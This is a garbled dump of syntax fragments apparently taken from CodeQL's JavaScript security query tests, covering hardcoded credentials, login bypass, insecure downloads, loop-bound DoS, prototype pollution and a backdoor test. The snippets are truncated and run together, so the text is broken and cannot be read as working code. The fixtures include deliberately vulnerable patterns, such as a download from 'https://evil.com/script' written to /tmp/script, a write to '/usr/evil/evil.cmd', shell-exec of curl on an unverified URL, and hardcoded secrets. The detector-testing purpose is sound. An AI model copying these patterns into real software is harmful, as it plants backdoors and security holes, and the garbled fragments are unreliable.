limited'catchAsyncvar mys ... ysql');mysql = ... mysql')var con ... db'\n});connect ... _db'\n})mysql.c ... _db'\n}){\n  hos ... y_db'\n}host    ... alhost'user     : 'me'password : 'secret'database : 'my_db'my_dbfunctio ... in(); }{ login(); }login();login()functio ... st"); }{ fs.wr ... st"); }fs.writ ... uest");fs.writ ... quest")functio ... ue"); }{ child ... ue"); }child_p ... true");child_p ... /true")/bin/truefunctio ... on'); }{ conne ... on'); }connect ... tion');connect ... ution')connection.query'SELECT ... lution'SELECT 1 + 1 AS solutionSELECT 1 + 1 AS solutionfunctio ... Hi"); }{ res.send("Hi"); }res.send("Hi");res.send("Hi")Hifunctio ... uter;\n}{\n  var ... uter;\n}router. ... dler1);router. ... ndler1)return router;app1 = express()app1.ge ... dler1);app1.ge ... ndler1)app1.getapp1.ge ... dler2);app1.ge ... ndler2)app1.ge ... dler3);app1.ge ... ndler3)app1.ge ... dler4);app1.ge ... ndler4)app1.ge ... ndler);app1.ge ... andler)app1.us ... er1());app1.us ... ter1())app1.usemkSubRouter1()var lim ... imit();limiter ... Limit()new RateLimit()app1.use(limiter);app1.use(limiter)app1.us ... er2());app1.us ... ter2())mkSubRouter2()app2 = express()var Exp ... rute');Express ... brute')require ... brute')express-brutevar bru ... rute();brutefo ... Brute()new ExpressBrute()app2.ge ... dler1);app2.ge ... ndler1)app2.getbruteforce.preventapp3 = express()var lim ... (app3);limiter ... )(app3)require ... )(app3)require ... miter')express-limiterapp3.ge ... dler1);app3.ge ... ndler1)app3.getexpress ... q); });express ... eq); })functio ... req); }{ verifyUser(req); }verifyUser(req);verifyUser(req)RateLimit()const { ... ible');{ RateL ... xible'){ RateLimiterRedis }require ... xible')'rate-l ... exible'rate-limiter-flexibleconst r ... edis();rateLim ... Redis()new Rat ... Redis()const r ... '));\n};rateLim ... d'));\n}rateLim ... dleware(req, r ... d'));\n}{\n  rat ... d'));\n}rateLim ... ted'));rateLim ... ited'))rateLim ... ).catchrateLim ... n(next)rateLim ... p).thenrateLim ... req.ip)rateLimiter.consumereq.ipres.sta ... mited')res.status(429).sendres.status(429)res.statusrate limitedexpress ... dler1);express ... ndler1)const c ... gs[2]);catchAs ... rgs[2])fn => ( ... rgs[2])(...arg ... rgs[2])fn(...a ... rgs[2])fn(...args).catchfn(...args)args[2]express ... ler1));express ... dler1))catchAs ... ndler1)catchAs ... leware)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-770/tst2.ts'./rateLimit'import  ... Limit';./rateLimit/rateLimitapp.use ... miter);app.use(rateLimiter)res.sen ... html');res.sen ... .html')/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/closure.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776 NOT OK: Closure expands internal entities by default/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/domparser.js NOT OK: DOMParser expands internal entities by default NOT OK: XMLDOM expands internal entities by default NOT OK: MSXML expands internal entities by default/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/expat.js NOT OK: expat expands internal entities by default{\n  var ... fault\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/jquery.js NOT OK: jQuery expands internal entities by default/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/libxml.js NOT OK: libxml expands internal general entities by default/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/libxml.noent.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/libxml.sax.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-776/libxml.saxpush.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-798/HardcodedCredentials.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-798 browser API// browser API OK - dummy password// OK - ... assword OK - just a protocol selector// OK - ... elector'dbuser''database.server.com''mydb''abcdefgh'3211"user:abcdefgh"getCredentialsgetUnknownCredentialsbasicAuth'express-basic-auth'users'admin''unknown-admin-name''basic-auth-connect''username'AWS'aws-sdk'accessKeyIdsecretAccessKeyConfig'auth''user''pass''bearerToken''bearer'MsRest'ms-rest-azure'loginWithUsernamePasswordAZURE_USERAZURE_PASSloginWithServicePrincipalSecretdigitalocean'digitalocean''TOKEN'DIGITAL_OCEAN_TOKENpkgcloud'pkgcloud'computeaccount'x1'keyId'x2'storageAccount'x3''x4'apiKeystorageAccessKeyINNOCENT_DATA'42'providersSOME_PROVIDER'x5'UNKNOWN_SERVICE'x6''x7'USERNAMEPASSWORD"crypto-js/aes"'my message'"cookie-session""abcdefgh"pass"change_me"'change_me'adminName'base-64'"node-fetch"'sdsdag'PASSAUTHrspENDPOINT'get'"Authorization"Basic 'post'headers2'node-fetch''some_actually_secrect_password'Authorization'Basic 'privateKey"myHardCodedPrivateKey"'RS256'publicKey"myHardCodedPublicKey"Basic foorsp2'Bearer''OAuth'accessToken(functi ... t();\n})functio ... ct();\n}{\n    c ... ct();\n}const c ...     });client  ... \n    })new pg. ... \n    })pg.Clientuser: 'dbuser'dbuserhost: ' ... er.com''databa ... er.com'database.server.comdatabase: 'mydb'mydbpassword: 'abcdefgh'abcdefghport: 3211client.connect();client.connect()client.connectrequire ... fgh"});require ... efgh"})require ... request{auth:  ... defgh"}auth: " ... cdefgh"user:abcdefghreturn  ... defgh";require ... ls()});require ... als()}){auth:  ... ials()}auth: g ... tials()getCredentials()getUnkn ... tials()getUnkn ... entials(functi ... s});\n})functio ... rs});\n}{\n    v ... rs});\n}var bas ... auth');basicAu ... -auth')require ... -auth')express-basic-authbasicAu ... h' }});basicAu ... gh' }}){users: ... fgh' }}users:  ... efgh' }{ 'admi ... efgh' }'admin': 'abcdefgh'adminvar users = {};users = {}users[' ... defgh';users[' ... cdefgh'users[' ... -name']unknown-admin-namebasicAu ... sers});basicAu ... users}){users: users}users: usersvar bas ... nect');basicAu ... nnect')require ... nnect')basic-auth-connectbasicAu ... efgh');basicAu ... defgh')basicAu ... n(){});basicAu ... on(){})(functi ... (o);\n})functio ... e(o);\n}{\n    v ... e(o);\n}var AWS ... -sdk');AWS = r ... s-sdk')require('aws-sdk')aws-sdkAWS.con ... fgh'});AWS.con ... efgh'})AWS.config.updateAWS.config{ acces ... defgh'}accessK ... ername'secretA ... cdefgh'new AWS ... fgh'});new AWS ... efgh'})AWS.Configvar con ... nfig();config  ... onfig()new AWS.Config()config. ... fgh'});config. ... efgh'})config.updateo.secre ... defgh';o.secre ... cdefgh'o.secretAccessKeyconfig.update(o);config.update(o)request ... efgh');request ... defgh')request ... l).authrequest.get(url)request.getrequest ...     });'auth': ...       }'user': 'username''pass': 'abcdefgh'request ... oken');request ... Token')bearerToken'bearer ... rToken'bearerrequest.post(url)request.head(url)request.headrequest(url).authrequest(url)const M ... zure');MsRest  ... azure')require ... azure')ms-rest-azureMsRest. ... n(){});MsRest. ... on(){})MsRest. ... asswordloginWi ... asswordprocess ... RE_USERprocess ... RE_PASSMsRest. ... lSecretloginWi ... lSecretvar dig ... cean');digital ... ocean')require ... ocean')digital ... OKEN');digital ... TOKEN')digitalocean.clientTOKENdigital ... TOKEN);digital ... _TOKEN)process ... N_TOKENvar pkg ... loud');pkgclou ... cloud')require('pkgcloud')pkgclou ...     });pkgclou ... \n    })pkgclou ... eClientpkgcloud.computeaccount: 'x1'keyId: 'x2'storageAccount: 'x3'x3username: 'x4'x4key: 'abcdefgh'apiKey: 'abcdefgh'storage ... cdefgh'token: 'abcdefgh'{ // OK ... '\n    }INNOCENT_DATA: '42'pkgclou ... computepkgclou ... ROVIDERpkgcloud.providersusername: 'x5'x5pkgclou ... SERVICE{  // O ... '\n    }username: 'x6'x6username: 'x7'x7{ // OK ... D\n    }usernam ... SERNAMEprocess.env.USERNAMEpasswor ... ASSWORDprocess.env.PASSWORD(functi ... h');\n})functio ... gh');\n}{\n    r ... gh');\n}require ... efgh');require ... defgh')require ... ateHmacrequire ... encryptrequire ... s/aes")crypto-js/aesmy message{\n    r ... " });\n}require ... gh" });require ... fgh" })require ... ssion"){ secre ... efgh" }secret: "abcdefgh"{ // OK ... }\n    }'user': '''pass': ... ASSWORDlet pas ...  || '';pass =  ... ) || ''getPassword() || '''user': ... R || ''process ... R || ''process.env.USER'pass': pass{\n\trequ ... // OK\n}require ... me" });require ... _me" }){ secre ... e_me" }secret: "change_me"require ... e_me');require ... ge_me')basicAu ... e' }});basicAu ... me' }}){users: ... _me' }}users:  ... e_me' }{ [admi ... e_me' }[adminN ... nge_me'(async  ... });\n});(async  ...  });\n})async f ...   });\n}const b ... e-64');base64  ... se-64')require('base-64')base-64const f ... etch");fetch = ... fetch")require ... fetch")node-fetchconst U ... dsdag';USER = 'sdsdag'sdsdagconst P ... dsdag';PASS = 'sdsdag'const A ... ASS}`);AUTH =  ... PASS}`)base64. ... PASS}`)base64.encode`${USER}:${PASS}`rsp = a ... \n    })await f ... \n    })fetch(E ... \n    })method: 'get'headers ...      })new fet ...      })fetch.Headers"Author ... {AUTH}``Basic ${AUTH}`"Conten ... n/json'method: 'post'body: J ... y(body)JSON.stringify(body)var hea ...     });headers ... \n    })new fet ... \n    })headers ... AUTH}`)headers.appendfetch(E ...     });{\n      ... s\n    }headers: headersheaders2.set{\n      ... 2\n    }headers: headers2(functi ... });\n});var hea ... ders();headers ... aders()new Headers()headers ... json');headers ... /json')headers ... UTH}`);{\n    i ...   });\n}import  ... fetch';const u ... dsdag';username = 'sdsdag'const p ... word');passwor ... sword')config. ... sword')config.get'some_a ... ssword'some_actually_secrect_passwordrespons ... \n    })Authori ... ase64')'Basic  ... ase64')Buffer. ... ase64')Buffer. ... ssword)usernam ... asswordusername + ':'var pri ... teKey";private ... ateKey""myHard ... ateKey"myHardCodedPrivateKeyvar tok ... 256'});token = ... S256'})jwt.sig ... S256'})jwt.sign{ foo: 'bar' }foo: 'bar'{ algor ... RS256'}algorithm: 'RS256'RS256var pub ... icKey";publicK ... licKey""myHard ... licKey"myHardCodedPublicKeyconsole ... coded);console.log(decoded)"Author ... ic foo``Basic foo`rsp2 =  ... \n    })"Author ... Token}``${foo  ... Token}`foo ? ' ... 'OAuth'BearerOAuth/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-807/example_bypass.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-807 BAD: login decision made based on user controlled data// BAD: ... ed data ... show private information// ...  ... rmation GOOD: login decision made based on server controlled data// GOOD ... ed data'/full-profile/:userId'loggedInUserIduserIdrequireLoginsignedCookiesapp.get ...  }\n\n});app.get ...   }\n\n})'/full- ... userId'/full-profile/:userIdfunctio ...    }\n\n}{\n\n     ...    }\n\n}if (req ... n\n    }req.coo ... .userIdreq.coo ... nUserIdreq.params.userIdrequireLogin();requireLogin()req.sig ... .userIdreq.sig ... nUserIdreq.signedCookies{ // OK ... ;\n    }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-807/tst-different-kinds-comparison-bypass.js OK, same kind of source// OK,  ...  source CSRF protection// CSRF protectionuserId1userId2authState{\n\n     ... // OK\n}req.que ... userId;req.que ... .userIdreq.query.userIdreq.cookies.userIdreq.que ... serId2;req.que ... userId2req.query.userId1req.query.userId2req.url == req.body;req.url == req.bodycheck(r ... serId);check(r ... userId)a == b;a == breq.coo ... y.csrf;req.coo ... ry.csrfreq.cookies.csrfreq.query.csrfreq.coo ... fToken;req.coo ... rfTokenreq.query.csrfTokenreq.coo ... .state;req.coo ... y.statereq.cookies.statereq.query.statereq.coo ... hState;req.coo ... thStatereq.query.authStatereq.coo ... .token;req.coo ... y.tokenreq.cookies.tokenreq.query.token/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-807/tst.js NOT OK: depends on user input// NOT  ... r input OK: not a sensitive action// OK:  ...  action NOT OK, depends on user input OK: but flagged anyway due to plain dominance analysis [INCONSISTENCY]// OK:  ... STENCY] OK: depends on something else// OK:  ... ng else NOT OK, but not detected due to flow limitations [INCONSISTENCY] OK: early return below// OK:  ... n below OK: early return// OK: early returnshutDownloginThinggetLoginv3cookieIdotherConditionrequestIdv1v2unauthorizedcommitriskAssessnment400'...'customerLoginriskAssessmentclientIpAddressverifiedvulnerableapp.get ...    }\n}){\n      ...     }\n}process.exit();process.exit()if(req. ... ;\n    }req.params.shutDownreq.coo ... inThingo.login();o.login()o.logino.getLogin();o.getLogin()o.getLoginreturn v;var v3  ... kieId);v3 = id ... okieId)id(req. ... okieId)req.cookies.cookieIdif (v3) ... ;\n    }if (oth ... }\n    }{ // NO ...       }if (req ... }\n    }if (oth ...       }if(req. ... )\n    }req.params.login{ // NO ... \n\n    }req.par ... ingElse{ // OK ... \n\n    }{ // NO ... )\n    }req.coo ... questIdreq.params.requestIdvar v1  ... uestId;v1 = re ... questIdif (v1) ... ;\n    }return p === q;p === qvar v2  ... estId);v2 = cm ... uestId)cmp(req ... uestId)if (v2) ... ;\n    }req.coo ... secret"unauthorized();unauthorized()commit. ... tring()commit. ... oStringcommit.author()commit.author{\n    i ...    }\n\n}if (!re ... n\n    }!req.bo ... == null!req.bo ... assword!req.bo ... sername!req.body!username!passwordriskAss ... == null{ // OK ... n\n    }res.sta ... ..' });res.sta ... ...' })res.status(400).sendres.status(400){ error ... '...' }error: '...'id: '...'custome ... dress);custome ... ddress)custome ... erLogin!verifiedreq.query.vulnerableverify();verify()while ( ... }\n    }{ // OK ...       }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-829/insecure-download.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-829nugget'nugget'downloadToolsinstallerbuildToolsinstallerUrl'http://download.microsoft.com/download/5/f/7/5f7acaeb-8363-451f-9425-68a90f98b238/visualcppbuildtools_full.exe'getBuildToolsInstallerPath'http://www.google.com'"https://download.microsoft.com/download/5/f/7/5f7acaeb-8363-451f-9425-68a90f98b238/visualcppbuildtools_full.exe""http://example.org/unsafe.APK""curl ""curl""ftp://example.org/unsafe.APK"writeFileAtomic"write-file-atomic""http://example.org/unsafe""foo.exe""foo.safe""http://example.org/unsafe.unknown"'unsafe.exe''foo.safe'const n ... gget');nugget  ... ugget')require('nugget')functio ... th())\n}{\n    f ... th())\n}nugget( ... => { })installer.urlvar con ... }\n    }constan ... }\n    }buildTo ...       }install ... ll.exe''http:/ ... ll.exe'http://download.microsoft.com/download/5/f/7/5f7acaeb-8363-451f-9425-68a90f98b238/visualcppbuildtools_full.exehttp://downloadmicrosoftcom/download/5/f/7/5f7acaeb-8363-451f-9425-68a90f98b238/visualcppbuildtools_fullgetBuil ... lerPathconst b ... ldToolsbuildTo ... ldToolsconstants.buildToolsurl: bu ... llerUrlbuildTo ... llerUrldownloa ... Path())getBuil ... rPath()request ... ) { });request ... () { })'http:/ ... le.com'http://www.google.comhttp://wwwnugget( ... l.exe")"https: ... ll.exe"https://download.microsoft.com/download/5/f/7/5f7acaeb-8363-451f-9425-68a90f98b238/visualcppbuildtools_full.exehttps://downloadnugget( ... e.APK")"http:/ ... fe.APK"http://example.org/unsafe.APKorg/unsafeAPKvar url ... e.APK";url = " ... fe.APK"cp.exec ... () {});cp.exec ...  () {})"curl " + urlcurl curl[url]"ftp:// ... fe.APK"ftp://example.org/unsafe.APKftp://examplevar wri ... omic");writeFi ... tomic")require ... tomic")write-file-atomic{\n    n ...   });\n}"http:/ ... unsafe"http://example.org/unsafe{target: "foo.exe"}target: "foo.exe"foo.exe{target: "foo.safe"}target: "foo.safe"foo.safe$.get(" ...     });$.get(" ... \n    })$.get"http:/ ... nknown"http://example.org/unsafe.unknownwriteFi ... r) {});writeFi ... rr) {})unsafe.exefunction (err) {}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionBad.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834 The obvious null-pointer detection should not hit this one.// The  ... is one. Constantly accessing element 0, therefore not guaranteed null-pointer.// Cons ... ointer.rootRouteproblemwhileLoopuseLengthIndirectlynoNullPointerretvar roo ... obar');rootRou ... oobar')router. ... oobar')router.routerootRou ... y);\n});rootRou ... dy);\n})rootRoute.post{\n    p ... ody);\n}problem(req.body);problem(req.body)whileLoop(req.body);whileLoop(req.body)useLeng ... .body);useLeng ... q.body)noNullP ... .body);noNullP ... q.body)var ret = [];ret = []for (va ... ;\n    }i < val.lengthval.lengthret.push(val[i]);ret.push(val[i])ret.pushval[i]var len ... length;len = val.lengthi < lenconst c = 0;c = 0for (va ...  \n    }{ // NO ...  \n    }ret.pus ... ].foo);ret.push(val[c].foo)val[c].fooval[c]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionExitBad.js Does not prevent DoS, because this is inside an inner loop.// Does ... r loop. Is caught, and therefore the DoS is not prevented.// Is c ... vented. Ignored.// Ignored. Does not prevent DoS.// Does ... nt DoS."lodash"breakslodashThrowvar _ = ... dash");_ = req ... odash")require("lodash"){\n\tbrea ... ody);\n}breaks(req.body);breaks(req.body)throws(req.body);throws(req.body)returns(req.body);returns(req.body)lodashT ... .body);lodashT ... q.body){\n\tvar  ...     }\n}for (va ...  }\n\t  }k < 2k++var k = 0k = 0{\n\t\t  i ...  }\n\t  }if (k = ...  \n\t\t  }k == 3{\n\t\t    ...  \n\t\t  }if (val ...  }\n\t  }val[i] == null{\n\t\t  t ...  }\n\t  }try {\n\t ... .\n\t\t  }{\n\t\t\t   ... .\n\t\t  }throw 2;catch(e ... .\n\t\t  }if (val ... );\n\t  }{\n\t\t  ( ... );\n\t  }(functi ...  })(i);(functi ...   })(i)(functi ... \n\t\t  })functio ... .\n\t\t  }return i+2;i+2functio ... }\n\t})\n}{\n\t_.ma ... }\n\t})\n}_.map(v ... \t\t}\n\t})_.mapfunctio ... \n\t\t}\n\t}{ // NO ... \n\t\t}\n\t}if (!e) ... \t\t}\n\t\t}!e{\n\t\t\ttr ... \t\t}\n\t\t}try {\n\t ... d.\n\t\t\t}{\n\t\t\t\tt ... S.\n\t\t\t}catch(e ... d.\n\t\t\t}{\n\t\t\t\t/ ... d.\n\t\t\t}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionExitGood.js Prevents DoS.// Prevents DoS.if (val ... S.\n\t  }{\n\t\t  b ... S.\n\t  }{\n\t\t  t ... S.\n\t  }{\n\t\t  r ... S.\n\t  }return 2;{ // OK ... \n\t\t}\n\t}if (!e) ... oS.\n\t\t}{\n\t\t\tth ... oS.\n\t\t}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionGood.js At this point we know that val must be an Array, and an attacker is// At t ... cker is therefore not able to send a cheap request that spends a lot of time// ther ... of time inside the loop.// inside the loop. Val can only be a primitive. Therefore no issue!// Val  ...  issue!sanitized2sanitized3sanitized4{\n    s ... ody);\n}sanitized(req.body);sanitized(req.body)sanitiz ... .body);sanitized2(req.body)sanitized3(req.body)sanitized4(req.body)if (!Ar ... ;\n    }!Array.isArray(val)Array.isArray(val)return [];ret.pus ...  + 42);ret.pus ... ] + 42)val[i] + 42typeof valfunctio ... rray;\n}{\n    r ... rray;\n}return  ...  Array;foo instanceof Arrayif (!is ... ;\n    }!isArray(val)isArray(val)if (!(v ... ;\n    }!(val i ...  Array)(val in ...  Array)val instanceof Array/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionLodash.js{\n    _ ... T OK!\n}_.chunk(val, 2);_.chunk(val, 2)_.chunk/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionNested.jspersonasparentescorootRou ...   }\n});rootRou ...    }\n})for (i  ... ;\n    }i < req ... .lengthreq.bod ... .lengthreq.body.personasreq.bod ... sco.id;req.bod ... esco.idreq.bod ... entescoreq.body.personas[i]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionObviousLengthCheck.js Prevents DoS// Prevents DoSif (val ... ;\n    }val.length > 100/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionObviousNullPointer.jsnullPointernullPointer2nullPointer3lodashPointerlodashArrowFuncmessaging{\n    n ... ody);\n}nullPoi ... .body);nullPoi ... q.body)lodashP ... .body);lodashP ... q.body)lodashA ... .body);lodashA ... q.body)ret.pus ... o + 42)val[i].foo + 42val[i].foovar ele ... val[i];element = val[i]element.foo + 42element.foofunctio ... id\n\t}\n}{\n\tlet  ... id\n\t}\n}let arr ... ssagingarr = val.messagingval.messagingfor (le ... r.id\n\t}{ // OK ... r.id\n\t}let eve ... ging[i]event = ... ging[i]val.messaging[i]let sen ... nder.idsender  ... nder.idevent.sender.idevent.sender{\n    r ...    })\n}_.map(v ... \n    })return e.foo;e.foo{\n\tretu ...   });\n}(e) =>  ... ;\n    }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-834/LoopBoundInjectionObviousNullPointerInPreviousLoop.js Has obvious null-pointer. And guards the next loop.// Has  ... t loop.ret.push(val[i].foo)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-843/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-843  OK//  OK  OK, but still flagged [INCONSISTENCY]//  OK, ... STENCY] prototype pollution here - but flagged in `safeGet`// prot ... afeGet` NOT OK - could be singleton array// NOT  ... n array'/some/path/:foo'someObjectsafeGet'__proto__''constructor'var foo ... ry.foo;foo = req.query.foofoo.indexOf();foo.indexOf()foo.indexOffoo.concat();foo.concat()foo.concatbar.concat();bar.concat()bar.concatg(foo);g(foo)req.url.indexOf();req.url.indexOf()req.url.indexOffoo.ind ...  === 0;foo.ind ... ) === 0foo.indexOf(prefix)foo.ind ... ) == 0;foo.ind ... x) == 0foo.ind ...  !== 0;foo.ind ... ) !== 0foo.sli ... == 'x';foo.sli ... === 'x'foo.slice(-1)foo.slicefoo.ind ... ) == 1;foo.ind ... x) == 1foo.slice(1) === 'x'foo.slice(1)typeof fooif (foo ... ]\n    }(foo +  ... exOf();(foo +  ... dexOf()(foo + f()).indexOf(foo + f())foo + f()foo.length;new Koa ...  OK\n});new Koa ... T OK\n})new Koa().usefoo = c ... ery.fooctx.req ... ery.fooctx.request.queryctx.requestexpress ... / OK\n})/some/path/:foovar foo ... ms.foo;foo = req.params.foo{\n    i ... // OK\n}if (req ... gth) {}req.que ... .lengthreq.que ... h == 0;req.que ... th == 0!req.qu ... length;!req.qu ... .lengthreq.que ... th > 0;req.que ... gth > 0let p = ... y.path;p = req.query.pathtypeof  ... string'typeof pp.lengthp = p.substr(1);p = p.substr(1)p.substr(1)p.substrp.length < 1;p.length < 1express ... et`\n});express ... Get`\n})functio ... eGet`\n}{\n    l ... eGet`\n}let someObject = {};someObject = {}safeGet ...  'baz';safeGet ... = 'baz'safeGet ... th).barsafeGet ... y.path)functio ... j[p];\n}{\n    i ... j[p];\n}if (p = ... ;\n    }p === ' ... ructor'p === '__proto__'p === 'constructor'return obj[p];obj[p]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-912/HttpToFileAccess.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-912'https://evil.com/script'"/tmp/script"https.g ... });\n});https.g ...  });\n})'https: ... script'https://evil.com/scriptcom/scriptres =>  ...   });\n}{\n  res ...   });\n}res.on( ... )\n  });res.on( ... d)\n  })d => {\n ...  d)\n  }{\n    f ...  d)\n  }fs.writ ... pt", d)/tmp/script/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-912/fs-writeFile-externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-912/tst.js adopted from  tslint backdoor, see https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e BAD: data from response 'on' event flows to file// BAD: ... to file BAD: data from response 'on' event flows to filestream write// BAD: ... m write GOOD: static data written to file// GOOD ... to file GOOD: static data written to file stream// GOOD ...  stream'hostname''/raw/XXXXXXXX''User-Agent''Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0''text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'"/tmp/test"writeStream'/usr/evil/evil.cmd'"my_file.txt"'open''error'"error occured"'/usr/good/errorlog.txt'https.g ... ;\n  });https.g ... );\n  })https.g ...   }).on{\n    ' ...   }\n  }'hostna ... le.com'path: ' ... XXXXXX'/raw/XXXXXXXXheaders ... '\n    }'User-A ... x/52.0''Mozill ... x/52.0'Accept: ... ;q=0.8''text/h ... ;q=0.8'(respon ... });\n  }{\n    r ... });\n  }respons ... utf8');respons ... 'utf8')response.setEncodingrespons ...     });response.on(c) =>  ... ;\n    }fs.writ ... => {});fs.writ ...  => {})/tmp/test(err) => {}let wri ... .cmd');writeSt ... l.cmd')fs.crea ... l.cmd')/usr/evil/evil.cmd/usr/evil/evilwriteSt ... ite(c);writeStream.write(c)writeStream.writewriteStream.end();writeStream.end()writeStream.endvar str ... .txt");stream  ... e.txt")fs.crea ... e.txt")my_file.txtmy_filestream. ...     });stream. ...      })stream.oncestream.write(c);stream.write(c)stream.writestream.end();stream.end()stream.end() => \n ... e\n    }{ \n\tfs. ... e\n    }fs.writ ... ured");fs.writ ... cured")error occured() => \n ... ();\n  }{ \n     ... ();\n  }let err ... cured";error = ... ccured"let wri ... .txt');writeSt ... g.txt')fs.crea ... g.txt')'/usr/g ... og.txt'/usr/good/errorlog.txt/usr/good/errorlogwriteSt ... error);writeSt ... (error)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingAssignment/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingAssignment/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915 NOT OK - may pollute, although attacker has no control over data being injected// NOT  ... njected OK - can't affect Object.prototype// OK - ... ototype OK - 'this' won't refer to Object.prototypemutateObjectunsafeGetPropsafeGetProppossiblyProtoBoxprototypeLessObjectdirectlyMutatedlet tai ... .data);taint = ... y.data)String( ... y.data)let object = {};object = {}object[ ...  taint;object[ ... = taintobject[taint][taint]object[taint]object[ ...  'bar';object[ ... = 'bar'object[taint].fooobject. ...  taint;object. ... = taintobject.baz[taint]object.bazmutateO ... blah');mutateO ... 'blah')unsafeG ...  'bar';unsafeG ... = 'bar'unsafeG ... nt).foounsafeG ...  taint)unsafeG ... e').foounsafeG ... 'safe')safeGet ...  'bar';safeGet ... = 'bar'safeGet ... nt).foosafeGet ...  taint)let pos ...  Box();possibl ... w Box()object[ ... w Box()new Box()possiblyProto.m();possiblyProto.m()possiblyProto.mlet pro ... (null);prototy ... e(null)prototy ...  taint;prototy ... = taintprototy ... [taint]let dir ... d = {};directlyMutated = {}directl ...  taint;directl ... = taintdirectl ... [taint]if (obj ... K\n    }object. ... (taint)object. ... roperty{\n    o ...     }\n}obj.foo = x;obj.foo = xobj.fooobj ins ...  Objectobj != nulltypeof objtypeof  ... object'return  ... : null;obj ? o ...  : nullobj[prop]{\n    i ... null;\n}if (pro ... ;\n    }prop == ... ructor'prop === '__proto__'class B ...     }\n}(x) {\n  ... ;\n    }this.x = x;this.x = xthis.xm() {\n  ... e\n    }() {\n   ... e\n    }this.foo = 'bar';this.foo = 'bar'this.foo/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunction/examples/PrototypePollutingFunction.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunction/examples/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunctiondstfor (le ... }\n    }let keyif (!sr ... ntinue;!src.ha ... ty(key)src.has ... ty(key)src.hasOwnPropertyif (isO ...       }isObject(dst[key])dst[key]merge(d ... [key]);merge(d ... c[key])src[key]dst[key] = src[key];dst[key] = src[key]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunction/examples/PrototypePollutingFunction_fixed.jsif (dst ...       }dst.has ... t[key])dst.has ... ty(key)dst.hasOwnProperty/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunction/examples/PrototypePollutingFunction_fixed2.js"__proto__""constructor"if (key ... ntinue;key === ... ructor"key === 